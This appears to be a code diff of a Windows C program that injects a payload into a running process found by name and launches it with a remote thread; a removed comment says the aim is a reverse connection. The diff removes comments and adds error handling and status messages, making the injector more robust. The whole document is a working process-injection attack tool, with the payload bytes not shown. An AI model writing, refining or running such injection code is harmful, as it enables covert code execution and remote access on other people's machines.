@@ -1,7 +1,3 @@
-/*
-    Inject payload to an existed process on target machine by it's name and then execute the payload to establish a reverse connection
-*/
-
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -34,22 +30,16 @@ unsigned int payload_len = sizeof(payload);
 
 int FindProccessIDbyName(const char *proc_name)
 {
-    HANDLE hSnapshot;  // Snapshot handle
-    PROCESSENTRY32 pe; // Process entry
+    HANDLE hSnapshot;
+    PROCESSENTRY32 pe;
     int pid = 0;
-    bool hResult;
+    BOOL hResult;
 
-    // Create snapshot of all process
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
-    {
-        CloseHandle(hSnapshot);
         return 0;
-    }
 
     pe.dwSize = sizeof(PROCESSENTRY32);
-
-    // Get first process info, then move to the next in a loop
     hResult = Process32First(hSnapshot, &pe);
     while (hResult)
     {
@@ -58,7 +48,6 @@ int FindProccessIDbyName(const char *proc_name)
             pid = pe.th32ProcessID;
             break;
         }
-
         hResult = Process32Next(hSnapshot, &pe);
     }
 
@@ -73,33 +62,57 @@ int main(int argc, char *argv[])
     PVOID rb;  // Remote buffer
     int pid = 0;
 
-    // Check input param
     if (argc != 2)
     {
         printf("Usage: %s <process name>\n", argv[0]);
-        printf("Example: %s calc.exe\n", argv[0]);
         exit(0);
     }
 
-    // Get process ID from it's name
     pid = FindProccessIDbyName(argv[1]);
     if (pid == 0)
     {
-        printf("Invalid process! Please try again");
+        printf("[-] Could not find process %s\n", argv[1]);
         exit(0);
     }
+    printf("[+] Found target PID: %d\n", pid);
 
-    // Open target process by input ID
+    // 1. Open target process
     ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+    if (ph == NULL)
+    {
+        printf("[-] OpenProcess failed. Error: %d\n", GetLastError());
+        return -1;
+    }
 
-    // Allocate memory buffer for target process
+    // 2. Allocate memory
     rb = VirtualAllocEx(ph, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    if (rb == NULL)
+    {
+        printf("[-] VirtualAllocEx failed. Error: %d\n", GetLastError());
+        CloseHandle(ph);
+        return -1;
+    }
+    printf("[+] Memory allocated at: 0x%p\n", rb);
 
-    // Copy payload to target process's new buffer
-    WriteProcessMemory(ph, rb, payload, payload_len, NULL);
+    // 3. Write memory
+    if (!WriteProcessMemory(ph, rb, payload, payload_len, NULL))
+    {
+        printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
+        CloseHandle(ph);
+        return -1;
+    }
 
-    // Create a remote thread running under target process
+    // 4. Create Remote Thread
     th = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+    if (th == NULL)
+    {
+        printf("[-] CreateRemoteThread failed. Error: %d\n", GetLastError());
+        CloseHandle(ph);
+        return -1;
+    }
+
+    printf("[+] Success! Remote thread created (TID: %d)\n", GetThreadId(th));
+
     CloseHandle(ph);
     CloseHandle(th);
 
